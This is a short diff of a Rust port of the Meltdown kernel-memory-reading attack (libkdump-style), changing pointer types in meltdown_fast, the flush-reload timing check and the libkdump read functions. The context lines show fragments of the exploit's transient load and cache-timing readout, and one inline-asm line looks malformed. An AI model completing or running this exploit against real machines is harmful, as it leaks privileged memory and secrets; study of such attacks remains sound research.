@@ -20,7 +20,7 @@ pub struct Config {
 	retries: u32,
 }
 
-pub fn meltdown_fast(mem: &[MemoryPage], pointer: *const u128) {
+pub fn meltdown_fast(mem: &[MemoryPage], pointer: *const u8) {
     unsafe {
         asm!(
             "mov {tmp} [{x}]",
@@ -79,7 +79,7 @@ pub fn flush_reload(cache_miss_threshold: u64, pointer: *const MemoryPage) -> bo
     end_time - start_time < cache_miss_threshold
 }
 
-pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u128) -> usize {
+pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> usize {
 	for _ in 0..config.retries {
 		// TODO: Set segmentation fault callback position
 		meltdown_fast(mem, pointer);
@@ -98,7 +98,7 @@ pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, 
 	return 0;
 }
 
-pub fn libkdump_read(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u128) -> u32 {
+pub fn libkdump_read(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> u32 {
 	const ARRAY_SIZE: usize = 256;
 	let mut res_stat: [u32; ARRAY_SIZE] = [0; ARRAY_SIZE];
 	
